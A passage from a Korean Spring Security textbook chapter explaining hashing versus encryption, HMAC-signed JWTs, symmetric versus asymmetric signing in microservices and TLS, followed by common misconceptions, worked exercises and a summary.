즉 `hasRole("ADMIN")`과 `hasAuthority("ROLE_ADMIN")`은 **같은 뜻**이다. 이 규칙을 모르면 "권한을 분명히 줬는데 403이 난다"는 미궁에 빠진다. 그래서 `UserDetails`나 JWT 클레임에 권한을 담을 때 `ROLE_ADMIN`처럼 접두어를 포함해 저장하는 것이 관례다.

## 5.6 해싱 vs 암호화: 되돌릴 수 있는가

5.2에서 "비밀번호는 암호화가 아니라 해싱"이라고 했다. 여기서 그 차이를 정확히 못 박는다. 이 구분은 실무 보안의 근간이며, 혼동하면 심각한 설계 오류로 이어진다.

### 단방향 vs 양방향

```
[해싱 vs 암호화 비교표]

  ┌────────────────┬─────────────────────┬─────────────────────────┐
  │                │ 해싱 (Hashing)       │ 암호화 (Encryption)      │
  ├────────────────┼─────────────────────┼─────────────────────────┤
  │ 방향           │ 단방향 (one-way)     │ 양방향 (two-way)         │
  │ 원문 복구       │ 불가능 (설계상)       │ 가능 (키가 있으면)        │
  │ 키(key)         │ 없음 (또는 솔트)     │ 반드시 필요               │
  │ 목적           │ "같은지 검증"         │ "숨겼다가 다시 보기"       │
  │ 대표 알고리즘   │ BCrypt, SHA-256      │ AES, RSA                 │
  │ 사용 예         │ 비밀번호 저장         │ 주민번호/카드번호 저장     │
  │ 결과 크기       │ 고정 길이            │ 원문 길이에 비례          │
  └────────────────┴─────────────────────┴─────────────────────────┘
```

```
[방향의 차이]

  해싱:   원문 ──────▶ 해시값     (되돌아가는 화살표 없음)
                  ✗
          해시값 ─X─▶ 원문        복구 불가 = 이게 목적이다

  암호화: 원문 ◀─────▶ 암호문     (키만 있으면 양방향)
              키
```

### BCrypt는 왜 복호화 함수가 없는가

Spring의 `PasswordEncoder` 인터페이스를 보면 `encode()`와 `matches()`는 있어도 `decode()`는 없다. 신입 개발자는 종종 "복호화 메서드를 못 찾겠다"고 헤맨다. 답은 명확하다.

**BCrypt에는 복호화가 없다. 없는 것이 아니라 '되돌릴 수 없음'이 곧 목적이기 때문이다.**

비밀번호를 저장하는 이유를 생각해 보자. 우리는 사용자의 원본 비밀번호를 **다시 볼 필요가 전혀 없다.** 로그인 시 필요한 것은 오직 "입력한 값이 저장된 값과 같은가?"라는 판단뿐이다. 이건 원문을 복구하지 않고도, 입력을 똑같이 해싱해서 비교하면(=`matches`) 된다.

만약 복호화가 가능하다면? 그건 곧 **서버(또는 서버를 턴 공격자)가 모든 사용자의 원본 비밀번호를 알 수 있다**는 뜻이다. 이는 우리가 처음부터 막고 싶었던 재앙 그 자체다. 그러므로 "복구 불가능"은 결함이 아니라 **의도된 안전장치**다.

### AES는 양방향, 그래서 키 관리 책임이 따라온다

반면 **주민등록번호, 신용카드번호, 실명** 같은 정보는 다르다. 이건 나중에 **다시 원문으로 봐야 한다.** (마스킹해서 화면에 보여주거나, 결제 시 실제 번호가 필요하거나.)

이런 데이터는 **암호화(AES 등 대칭키)**로 저장한다. AES는 양방향이므로 키만 있으면 원문을 복구할 수 있다. 하지만 이 편리함에는 무거운 책임이 따른다.

```
[암호화의 책임: 키 관리]

  암호화된 데이터의 안전성 = 키의 안전성

  데이터는 아무리 강하게 암호화해도,
  키가 유출되면 → 전부 복호화 가능 → 무방비

  그래서:
    - 키를 코드/DB에 함께 두면 안 됨 (같이 털림)
    - 키 관리 시스템(KMS), 볼트(Vault), HSM 등에 분리 보관
    - 키 교체(rotation) 정책 필요
```

해싱은 키가 없으니 "키를 잃어버리거나 털릴" 걱정이 없다. 암호화는 강력하지만 **키 관리라는 새로운 책임**을 통째로 떠안는다.

### 판단 기준: "원문을 다시 볼 일이 있는가?"

두 기법 중 무엇을 쓸지는 딱 한 질문으로 갈린다.

```
[의사결정]

           "이 데이터의 원문을 나중에 다시 봐야 하는가?"
                          │
             ┌────────────┴────────────┐
            아니오                      예
             │                          │
             ▼                          ▼
      해싱 (BCrypt)              암호화 (AES)
      예: 비밀번호               예: 주민번호, 카드번호
      "같은지만 확인하면 됨"      "복호화해서 써야 함 → 키 관리"
```

- 원문을 다시 볼 일이 **없다** → **해싱**. (비밀번호가 대표)
- 원문을 다시 봐야 **한다** → **암호화**. (개인식별정보가 대표, 대신 키 관리 책임)

이 한 문장이 5.6의 결론이다.

## 5.7 HMAC과 대칭/비대칭 키: JWT 서명의 정체

JWT의 세 번째 조각인 **Signature**가 어떻게 위조를 막는지, 그 밑바닥 암호 원리를 판다. 이 절은 "JWT가 왜 안전한가"를 넘어서 "그 안전성의 종류"까지 이해하게 한다.

### HMAC-SHA256: 서명의 정체

JWT의 기본 서명 알고리즘 `HS256`은 **HMAC-SHA256**이다. HMAC은 **Hash-based Message Authentication Code**의 약자다.

```
[HMAC의 동작]

  HMAC = 해시(메시지 + 비밀키)  ← 아주 단순화한 개념

  Signature = HMAC_SHA256( "Header.Payload", secret )

  핵심:  secret 을 아는 사람만 올바른 Signature를 계산할 수 있다.
```

일반 해시(SHA-256)와의 결정적 차이: **비밀키(secret)가 섞여 들어간다.** 그래서 secret을 모르면 아무리 메시지를 알아도 올바른 서명을 만들 수 없다.

```
[secret을 아는 사람만 서명 가능]

  발급 서버 (secret 있음):
     "Header.Payload" + secret → HMAC → 올바른 Signature ✅

  공격자 (secret 없음):
     Payload를 role:ADMIN 으로 조작 시도
     "조작된Payload" + ??? → 올바른 Signature 못 만듦 ❌
     (secret이 없으니 서명 위조 불가)

  검증 서버 (secret 있음):
     받은 Payload로 서명을 다시 계산 → 첨부된 Signature와 대조
     다르면 → "위조됨" 거부
```

### HMAC이 보증하는 것: 무결성과 인증성

HMAC 서명이 지키는 것은 두 가지다.

- **무결성(Integrity)**: 메시지(Payload)가 **변조되지 않았음**을 보증한다. 한 글자만 바뀌어도 서명 검증이 실패한다.
- **인증성(Authenticity)**: 이 메시지가 **secret을 아는 정당한 발급자**가 만들었음을 보증한다. (secret을 가진 것은 우리 서버뿐이므로.)

### 중요: HMAC은 암호화가 아니다

또 한 번 못 박는다. **HMAC은 암호화가 아니다.** HMAC은 메시지를 숨기지 않는다. 그저 "이 메시지가 진짜이고 안 바뀌었다"는 **꼬리표(서명)**를 붙일 뿐이다. 그래서:

- HMAC 서명이 있어도 Payload는 여전히 누구나 읽을 수 있다(5.3의 Base64 경고와 동일 맥락).
- HMAC은 **무결성/인증성**을 지키지 기밀성을 지키지 않는다.

편지 봉투에 찍는 **밀랍 인장**을 떠올리면 정확하다. 인장은 "이 편지가 진짜 발신인 것이고 뜯기지 않았다"를 보증하지만, 편지 내용을 숨기지는 않는다.

### 대칭키(HS256) vs 비대칭키(RS256)

JWT 서명 방식은 크게 두 갈래다. 여기서부터가 핵심이다.

```
[대칭 vs 비대칭]

  대칭키 (HS256, HMAC):
    하나의 secret 으로 "서명"도 하고 "검증"도 한다.
    ┌─────────┐  같은 키   ┌─────────┐
    │ 서명    │◀─────────▶│ 검증    │
    │(secret) │  secret    │(secret) │
    └─────────┘            └─────────┘

  비대칭키 (RS256, RSA):
    키가 한 쌍(개인키/공개키).
    - 개인키(private): 서명 전용 (발급자만 보유, 절대 비공개)
    - 공개키(public): 검증 전용 (누구에게나 배포 가능)
    ┌──────────────┐            ┌──────────────┐
    │ 서명          │            │ 검증          │
    │ (개인키)      │ ─────────▶ │ (공개키)      │
    │ 발급자만 보유  │            │ 누구나 가질 수 │
    └──────────────┘            └──────────────┘
```

- **HS256(대칭)**: 서명과 검증에 **같은 secret**을 쓴다. 단순하고 빠르다.
- **RS256(비대칭)**: **개인키로 서명, 공개키로 검증**한다. 서명하는 능력과 검증하는 능력이 **분리**된다.

### MSA에서 대칭키의 문제

단일 서버라면 HS256으로 충분하다. 서명하는 것도 나, 검증하는 것도 나이니 secret 하나면 된다. 그런데 **마이크로서비스(MSA)** 환경에서는 문제가 생긴다.

```
[MSA에서 대칭키(HS256)의 위험]

           인증서버 (토큰 발급, secret 보유)
                        │ 토큰 발급
       ┌────────────────┼────────────────┐
       ▼                ▼                ▼
  주문서비스        결제서비스        배송서비스
  (검증하려면       (검증하려면       (검증하려면
   secret 필요)     secret 필요)     secret 필요)

  → 검증하려면 모든 서비스가 "같은 secret"을 가져야 한다.
  → secret이 수많은 서비스에 복제됨.
  → 그중 단 하나만 유출돼도 → 공격자가 토큰을 위조할 수 있다!
    (검증용 secret == 서명용 secret 이므로)
```

대칭키의 근본 문제: **검증할 수 있는 자는 서명(위조)도 할 수 있다.** 검증을 위해 secret을 배포하는 순간, 위조 능력까지 함께 배포하는 셈이다.

### 비대칭키가 해결하는 것: 발급 능력과 검증 능력의 분리

비대칭키(RS256)는 이 문제를 우아하게 푼다.

```
[MSA에서 비대칭키(RS256)]

       인증서버 (개인키 보유 - 서명 전용, 절대 비공개)
                        │ 개인키로 서명한 토큰 발급
       ┌────────────────┼────────────────┐
       ▼                ▼                ▼
  주문서비스        결제서비스        배송서비스
  (공개키로 검증)   (공개키로 검증)   (공개키로 검증)

  → 각 서비스는 "공개키"만 가진다.
  → 공개키가 유출돼도 안전하다! 공개키로는 검증만 가능, 서명(위조) 불가.
  → 토큰을 만들 수 있는 것은 개인키를 가진 인증서버뿐.
```

- **개인키(서명)**는 인증 서버 단 한 곳에만 있다 → 위조 능력이 한 곳에 집중, 유출 표면 최소화.
- **공개키(검증)**는 모든 서비스에 배포해도 안전하다 → 공개키로는 검증만 되고 서명은 못 하니까.

이것이 **발급 능력과 검증 능력의 분리**다. 대칭키에서는 불가능했던 일이다.

### 판단 기준

```
[언제 무엇을 쓰나]

  단일 서버 / 모놀리식        → HS256 (대칭)
    서명도 검증도 나 혼자      단순, 빠름, secret 하나면 충분

  MSA / 여러 서비스가 검증     → RS256 (비대칭)
    발급은 한 곳, 검증은 여럿   공개키만 배포 → 유출돼도 위조 불가
```

### 같은 원리: TLS/HTTPS

이 대칭/비대칭 조합은 JWT만의 이야기가 아니다. **HTTPS(TLS)도 정확히 같은 원리**로 작동한다.

```
[TLS 핸드셰이크의 핵심 아이디어]

  문제: 대칭키 암호는 빠르지만, "그 대칭키를 어떻게 안전하게 나눠 갖지?"
        (도청되는 네트워크에서 대칭키를 그냥 보내면 도청당함)

  해결(단순화):
    1. 서버가 공개키를 준다 (인증서에 담겨서)
    2. 클라이언트가 "세션에 쓸 대칭키"를 만들어, 서버의 공개키로 암호화해 보낸다
    3. 서버는 자기 개인키로만 그 대칭키를 복호화할 수 있다
    4. 이제 둘만 아는 대칭키가 생겼다 → 이후 통신은 빠른 대칭키로 암호화

  즉: 비대칭키로 "대칭키를 안전하게 교환"하고,
      실제 데이터는 빠른 "대칭키"로 암호화한다.
```

비대칭키는 안전하지만 느리고, 대칭키는 빠르지만 키 교환이 문제다. TLS는 **비대칭으로 세션키(대칭키)를 안전하게 교환한 뒤, 실제 대량 통신은 대칭으로** 하는 하이브리드다. JWT의 RS256/HS256 선택과 뿌리가 같은 사고방식이다.

> 더 깊이: TLS 핸드셰이크의 전체 과정(인증서 체인, CA 신뢰, TLS 1.3)은 `CS_네트워크_개념서`에서 본격적으로 다룬다. 이 절은 그 원리가 JWT의 대칭/비대칭 선택과 동일하다는 점을 짚는 데 목적이 있다.

## ⚠️ 흔한 오해와 함정

### 오해 1: "JWT는 암호화되어 있어서 안전하다"

**틀렸다.** JWT의 Payload는 **암호화가 아니라 Base64Url 인코딩**일 뿐이다. 누구나 디코딩해서 읽을 수 있다. JWT가 보증하는 것은 **무결성**(서명으로 위조 방지)이지 **기밀성**(내용 숨김)이 아니다. → **민감정보(비밀번호, 주민번호)를 Payload에 절대 넣지 말 것.**

### 오해 2: "해싱과 암호화는 같은 것이다"

**다르다.** 해싱은 **단방향**(복구 불가, 검증용), 암호화는 **양방향**(복구 가능, 은닉용)이다. 비밀번호는 해싱(BCrypt), 다시 봐야 하는 개인정보는 암호화(AES). "복호화가 안 되는데요?"라고 묻는다면 해싱을 암호화로 착각한 것이다. BCrypt에 복호화가 없는 건 버그가 아니라 **설계 목적**이다.

### 오해 3: "CSRF 보호는 항상 켜야 한다"

**맥락에 따라 다르다.** CSRF는 **쿠키가 자동 전송된다**는 점을 악용하는 공격이다. 쿠키 기반 세션 인증이면 **반드시 켜야** 한다. 하지만 JWT를 `Authorization` 헤더로 보내는 STATELESS API에서는 쿠키 자동 전송 전제가 없으므로 CSRF 벡터가 없고, 그래서 끈다. "무조건 켜라/꺼라"가 아니라 **인증 방식에 따른 판단**이다.

### 오해 4: "BCrypt를 쓰면 솔트를 따로 관리해야 한다"

**아니다.** BCrypt는 **솔트를 자동으로 생성**해서 해시 결과 문자열(`$2a$10$솔트...해시`) 안에 함께 저장한다. 개발자가 솔트 컬럼을 따로 만들거나 관리할 필요가 없다. `matches()`가 저장된 문자열에서 솔트를 알아서 추출해 검증한다. (SHA 계열을 직접 쓸 때는 솔트를 손수 관리해야 하지만, 애초에 비밀번호에 SHA를 직접 쓰지 말 것.)

### 오해 5: "hasRole('ROLE_ADMIN')으로 검사하면 된다"

**틀렸다.** `hasRole()`은 내부적으로 `ROLE_` 접두어를 자동으로 붙인다. `hasRole("ROLE_ADMIN")`은 `ROLE_ROLE_ADMIN`을 찾게 되어 매칭 실패한다. **`hasRole("ADMIN")`** 또는 **`hasAuthority("ROLE_ADMIN")`**를 써야 한다.

## 연습문제

### 문제 1

어떤 API가 로그인은 됐는데 관리자 페이지 접근 시 **403 Forbidden**을 반환한다. 이것은 인증 문제인가, 인가 문제인가? 그리고 401이 아니라 403이 나온다는 사실은 무엇을 의미하는가?

<details>
<summary>힌트</summary>
401과 403의 차이, 그리고 "인증은 성공했지만..."을 생각해 보라.
</details>

<details>
<summary>해설</summary>
<b>인가(Authorization) 문제</b>다. 403이 나왔다는 것은 서버가 이미 "너 누구인지는 확인했다(인증 성공)"는 뜻이다. 만약 인증 자체가 실패했다면 401이 나왔을 것이다. 즉 로그인은 됐지만(인증 O) 관리자 권한(ROLE_ADMIN)이 없어서(인가 X) 거부된 것이다. 이 사용자에게 ADMIN 역할을 부여하거나, 해당 URL의 접근 규칙을 확인해야 한다.
</details>

### 문제 2

동료가 "성능을 위해 비밀번호를 BCrypt 대신 SHA-256으로 해싱하자. SHA-256이 훨씬 빠르다"고 제안한다. 이 제안의 문제점을 설명하라.

<details>
<summary>힌트</summary>
비밀번호 해싱에서 "빠름"은 장점인가 단점인가?
</details>

<details>
<summary>해설</summary>
비밀번호 해싱에서 <b>빠른 것은 오히려 취약점</b>이다. SHA-256이 빠르다는 것은 공격자가 무차별 대입(brute force)으로 초당 수십억 개의 후보를 시도할 수 있다는 뜻이다. BCrypt는 <b>의도적으로 느리게</b> 설계되어(그리고 cost로 조절 가능) 공격 비용을 수년~수백년으로 끌어올린다. 정상 로그인 1회의 0.1초는 사용자가 못 느끼지만, 공격자에게는 치명적 장벽이 된다. 또한 BCrypt는 솔트를 자동 관리한다. 성능 이득 몇 밀리초를 위해 보안을 포기하는 것은 잘못된 트레이드오프다.
</details>

### 문제 3

프론트엔드 개발자가 "JWT Payload에 사용자 비밀번호와 주민번호를 넣어두면, 매번 서버에 물어볼 필요 없이 편하겠다"고 한다. 왜 이것이 위험한가?

<details>
<summary>힌트</summary>
Payload는 암호화되어 있는가? Base64는 무엇인가?
</details>

<details>
<summary>해설</summary>
JWT의 Payload는 <b>암호화가 아니라 Base64Url 인코딩</b>일 뿐이다. 브라우저 콘솔에서 `atob()` 한 줄, 또는 jwt.io 사이트에 붙여넣기만 해도 누구나 내용을 읽을 수 있다. 서명(Signature)이 지키는 것은 <b>무결성(위조 방지)</b>이지 <b>기밀성(내용 은닉)</b>이 아니다. 따라서 비밀번호, 주민번호 같은 민감정보를 넣으면 토큰을 가로챈 누구에게나 그대로 노출된다. Payload에는 사용자 ID, 역할처럼 노출돼도 되는 최소 정보만 담아야 한다.
</details>

### 문제 4

단일 서버 서비스를 여러 마이크로서비스로 분리하려 한다. 기존에는 JWT를 HS256(대칭키)으로 서명했다. MSA로 가면서 이 방식을 그대로 쓰면 어떤 위험이 있고, 어떻게 개선해야 하는가?

<details>
<summary>힌트</summary>
검증을 하려면 각 서비스가 무엇을 가져야 하는가? 대칭키에서 그것은 무엇을 의미하는가?
</details>

<details>
<summary>해설</summary>
HS256(대칭키)은 <b>서명과 검증에 같은 secret</b>을 쓴다. MSA에서 각 서비스가 토큰을 검증하려면 모두 그 secret을 가져야 하는데, 대칭키에서 "검증할 수 있는 자는 서명(위조)도 할 수 있다." 즉 secret이 수많은 서비스에 복제되고, 그중 하나만 유출돼도 공격자가 토큰을 위조할 수 있다.<br><br>
개선책은 <b>RS256(비대칭키)</b>이다. 인증 서버만 <b>개인키(서명 전용)</b>를 갖고, 각 서비스에는 <b>공개키(검증 전용)</b>만 배포한다. 공개키는 유출돼도 검증만 가능할 뿐 서명(위조)은 불가능하다. 발급 능력(개인키)과 검증 능력(공개키)이 분리되어 유출 위험 표면이 크게 줄어든다.
</details>

### 문제 5

`hasRole("ADMIN")`으로 접근 제어를 걸었는데, 분명히 사용자에게 관리자 권한을 줬음에도 계속 403이 발생한다. 저장된 권한 문자열이 `"ADMIN"`(접두어 없음)일 때 무엇이 문제이며, 어떻게 고쳐야 하는가?

<details>
<summary>힌트</summary>
hasRole은 내부적으로 무엇을 자동으로 붙이는가?
</details>

<details>
<summary>해설</summary>
`hasRole("ADMIN")`은 내부적으로 <b>ROLE_ 접두어를 자동으로 붙여</b> `"ROLE_ADMIN"`과 비교한다. 그런데 저장된 권한이 접두어 없는 `"ADMIN"`이면 `"ROLE_ADMIN" ≠ "ADMIN"`이라 매칭에 실패해 403이 난다.<br><br>
해결책은 두 가지다. (1) 권한을 저장할 때 관례대로 <b>`"ROLE_ADMIN"`으로 접두어를 포함</b>해 저장한다(권장). 그러면 `hasRole("ADMIN")`이 정상 동작한다. 또는 (2) 접두어 없이 저장된 값을 그대로 검사하려면 `hasAuthority("ADMIN")`을 쓴다(접두어를 붙이지 않고 문자열 그대로 비교). 참고로 `hasRole("ROLE_ADMIN")`처럼 접두어를 직접 넣으면 `ROLE_ROLE_ADMIN`이 되어 또 실패한다.
</details>

## 요약

- **인증(Authentication)은 "너 누구야?"(신원 확인, 여권), 인가(Authorization)는 "너 이거 할 수 있어?"(권한 확인, 탑승권)**다. 인증이 먼저, 인가가 나중. 실패 시 각각 401, 403.
- **비밀번호는 평문 저장 금지**. 단방향 **해싱**으로 저장한다. 좋은 해시는 단방향·결정적·눈사태 효과를 가진다.
- **BCrypt를 쓰는 이유는 "느려서"**다. 의도적으로 느리게(cost 조절) 만들어 무차별 대입을 막는다. MD5/SHA는 너무 빨라서 비밀번호에 부적합.
- **레인보우 테이블**은 솔트(Salt)로 막는다. BCrypt는 솔트를 자동 생성·저장하므로 개발자가 따로 관리할 필요가 없다. `encode()`/`matches()`만 쓰면 된다.
- **세션 방식**은 서버가 상태를 기억(손목밴드+장부) → 확장·재시작에 약함. **JWT**는 정보를 토큰에 담아(여권) 서버가 상태를 안 가짐 → 확장성·MSA·모바일에 강함. 단 무효화 어려움, 토큰 크기, 민감정보 불가라는 대가.
- **JWT = Header.Payload.Signature**. Payload는 암호화가 아니라 Base64 인코딩(누구나 읽음). Signature가 위조를 막는다.
- **Security Filter Chain**은 CORS → CSRF → 인증(JWT) → 인가 순의 관문(공항 보안 검색대). STATELESS + JWT 헤더 환경에서는 CSRF를 끄고, Same-Origin Policy 때문에 CORS를 설정한다.
- **RBAC**는 권한을 역할로 묶는다. URL 기반(`authorizeHttpRequests`)과 메서드 기반(`@PreAuthorize`)이 있고, `hasRole("X")`는 `ROLE_X`와 비교(접두어 자동), `hasAuthority`는 문자열 그대로 비교한다.
- **해싱 vs 암호화**: 원문을 다시 볼 일이 없으면 해싱(BCrypt), 다시 봐야 하면 암호화(AES, 대신 키 관리 책임). BCrypt에 복호화가 없는 것은 "되돌릴 수 없음"이 목적이기 때문.
- **HMAC(HS256)**은 secret을 아는 자만 서명 가능 → 무결성·인증성 보증(암호화 아님). **대칭키(HS256)**는 secret 하나로 서명·검증 → 단일 서버에 적합. **비대칭키(RS256)**는 개인키 서명/공개키 검증으로 발급 능력과 검증 능력을 분리 → MSA에 적합. **TLS/HTTPS도 같은 원리**(비대칭으로 대칭키 교환 후 대칭 암호화).

실제 동작하는 JWT 발급/검증, Security 설정, RBAC 코드는 `chapter07-spring-security` 모듈에서 확인하라.
